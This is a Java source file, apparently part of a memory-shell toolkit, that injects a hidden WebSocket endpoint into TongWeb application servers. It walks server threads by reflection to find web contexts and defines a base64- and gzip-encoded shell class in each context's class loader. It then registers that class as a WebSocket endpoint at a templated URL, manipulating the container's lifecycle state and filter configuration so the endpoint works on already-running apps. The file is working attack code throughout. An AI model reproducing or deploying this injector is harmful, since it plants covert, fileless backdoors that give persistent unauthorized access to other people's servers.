package com.reajason.javaweb.memshell.injector.tongweb;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.Collection;
import java.util.Collections;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * TongWeb JSR-356 WebSocket 注入器：TongWeb 6.0.7+ 内置 Tomcat 系 WebSocket 实现
 * （{@code com.tongweb.web.websocket}），从 ServletContext 取出 {@code ServerContainer}
 * 后注册 Endpoint。
 * <p>
 * TongWeb 7.0.8+ 对热部署应用不执行 {@code WsSci}，ServletContext 里既没有
 * {@code ServerContainer} 属性也没有 WsFilter，需要运行时手动初始化。
 *
 * @author ReaJason
 */
public class TongWebWebSocketInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public TongWebWebSocketInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        if (contexts == null || contexts.isEmpty()) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object shell = getShell(context);
                    if (inject(context, shell)) {
                        msg += "[" + getUrlPattern() + "] ready\n";
                    } else {
                        msg += "skip, no ServerContainer\n";
                    }
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        ok = true;
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    /**
     * com.tongweb.web.thor.core.ThorStandardContext
     * /opt/tweb6/lib/twnt.jar
     * com.tongweb.catalina.core.StandardContext
     * /opt/tweb7/lib/tongweb.jar
     * com.tongweb.server.core.StandardContext
     * /opt/tweb8/version8.0.6.2/tongweb-web.jar
     */
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            try {
                if (thread.getName().contains("ContainerBackgroundProcessor")) {
                    Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                    Collection<?> values = childrenMap.values();
                    for (Object value : values) {
                        Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                        contexts.addAll(children.values());
                    }
                } else if (thread.getContextClassLoader() != null) {
                    String name = thread.getContextClassLoader().getClass().getSimpleName();
                    if (name.matches(".+WebappClassLoader")) {
                        Object resources = getFieldValue(thread.getContextClassLoader(), "resources");
                        // need WebResourceRoot not DirContext
                        if (resources != null && resources.getClass().getName().endsWith("Root")) {
                            Object context = getFieldValue(resources, "context");
                            contexts.add(context);
                        }
                    }
                }
            } catch (Exception ignored) {

            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        msg += "[" + classLoader.getClass().getName() + "] ";
        return clazz.newInstance();
    }

    private boolean inject(Object context, Object shell) throws Exception {
        Object servletContext = invokeMethod(context, "getServletContext", null, null);
        Object container = getServerContainer(servletContext);
        if (container == null) {
            container = initServerContainer(context, servletContext);
            if (container == null || !registerWsFilterConfig(context)) {
                return false;
            }
        }

        if (invokeMethod(container, "findMapping", new Class[]{String.class}, new Object[]{getUrlPattern()}) != null) {
            return true;
        }

        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        Class<?> serverEndpointConfigClass;
        Class<?> builderClass;
        try {
            serverEndpointConfigClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
            builderClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
        } catch (ClassNotFoundException e) {
            serverEndpointConfigClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig");
            builderClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig$Builder");
        }

        Constructor<?> constructor = builderClass.getDeclaredConstructor(Class.class, String.class);
        constructor.setAccessible(true);
        Object builder = constructor.newInstance(shell.getClass(), getUrlPattern());
        Object endpointConfig = invokeMethod(builder, "build", null, null);

        invokeMethod(container, "setDefaultMaxTextMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
        invokeMethod(container, "setDefaultMaxBinaryMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
        invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
        return true;
    }

    private Object getServerContainer(Object servletContext) throws Exception {
        Object container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
        if (container == null) {
            container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"jakarta.websocket.server.ServerContainer"});
        }
        return container;
    }

    /**
     * TongWeb 的 {@code WsServerContainer} 在构造时通过 {@code ApplicationContext.addFilter}
     * 注册 WsFilter，而该方法要求上下文处于 STARTING_PREP 状态；容器已启动时直接调用
     * {@code WsSci.init} 会抛 IllegalStateException，所以临时改状态、初始化完再改回去。
     */
    @SuppressWarnings("all")
    private Object initServerContainer(Object context, Object servletContext) throws Exception {
        Object oldState = invokeMethod(context, "getState", null, null);
        if (oldState == null) {
            return null;
        }
        Class<?> wsSciClass = context.getClass().getClassLoader().loadClass("com.tongweb.web.websocket.server.WsSci");
        Method initMethod = null;
        for (Method method : wsSciClass.getDeclaredMethods()) {
            // 参数类型随版本是 javax.servlet.ServletContext 或 jakarta.servlet.ServletContext
            if ("init".equals(method.getName()) && method.getParameterTypes().length == 2) {
                initMethod = method;
                break;
            }
        }
        if (initMethod == null) {
            return null;
        }
        Object startingPrep = Enum.valueOf((Class) oldState.getClass(), "STARTING_PREP");
        setFieldValue(context, "state", startingPrep);
        Object container;
        try {
            initMethod.setAccessible(true);
            container = initMethod.invoke(null, servletContext, Boolean.FALSE);
        } finally {
            setFieldValue(context, "state", oldState);
        }
        if (container == null) {
            container = getServerContainer(servletContext);
        }
        return container;
    }

    /**
     * WsSci 只补了 FilterDef/FilterMap，ApplicationFilterConfig 要到 filterStart 阶段才创建；
     * 手动放进 filterConfigs，WebSocket 升级请求才会经过 WsFilter。
     * ApplicationFilterConfig 的包名随 TongWeb 版本变化，构造器都是
     * {@code (Context, FilterDef)}。
     */
    @SuppressWarnings("all")
    private boolean registerWsFilterConfig(Object context) throws Exception {
        Object wsFilterDef = null;
        for (Object filterDef : findFilterDefs(context)) {
            Object filterClass = invokeMethod(filterDef, "getFilterClass", null, null);
            if (filterClass != null && String.valueOf(filterClass).endsWith(".WsFilter")) {
                wsFilterDef = filterDef;
                break;
            }
        }
        if (wsFilterDef == null) {
            return false;
        }
        Map<Object, Object> filterConfigs = (Map<Object, Object>) getFieldValue(context, "filterConfigs");
        Object filterName = invokeMethod(wsFilterDef, "getFilterName", null, null);
        if (filterConfigs.containsKey(filterName)) {
            return true;
        }
        ClassLoader classLoader = context.getClass().getClassLoader();
        String[] configClassNames = new String[]{
                "com.tongweb.server.core.ApplicationFilterConfig",
                "com.tongweb.catalina.core.ApplicationFilterConfig",
                "com.tongweb.web.thor.core.ApplicationFilterConfig",
                "com.tongweb.container.core.ApplicationFilterConfig"
        };
        for (String className : configClassNames) {
            Class<?> configClass;
            try {
                configClass = classLoader.loadClass(className);
            } catch (ClassNotFoundException e) {
                continue;
            }
            for (Constructor<?> constructor : configClass.getDeclaredConstructors()) {
                Class<?>[] parameterTypes = constructor.getParameterTypes();
                if (parameterTypes.length == 2
                        && parameterTypes[0].isInstance(context)
                        && parameterTypes[1].isInstance(wsFilterDef)) {
                    constructor.setAccessible(true);
                    filterConfigs.put(filterName, constructor.newInstance(context, wsFilterDef));
                    return true;
                }
            }
        }
        return false;
    }

    private Iterable<?> findFilterDefs(Object context) throws Exception {
        Object filterDefs = invokeMethod(context, "findFilterDefs", null, null);
        if (filterDefs instanceof Iterable) {
            return (Iterable<?>) filterDefs;
        }
        if (filterDefs instanceof Object[]) {
            return Arrays.asList((Object[]) filterDefs);
        }
        if (filterDefs instanceof Map) {
            return ((Map<?, ?>) filterDefs).values();
        }
        return Collections.emptyList();
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        Field field = getField(obj, name);
        field.setAccessible(true);
        return field.get(obj);
    }

    @SuppressWarnings("all")
    public static void setFieldValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = getField(obj, name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
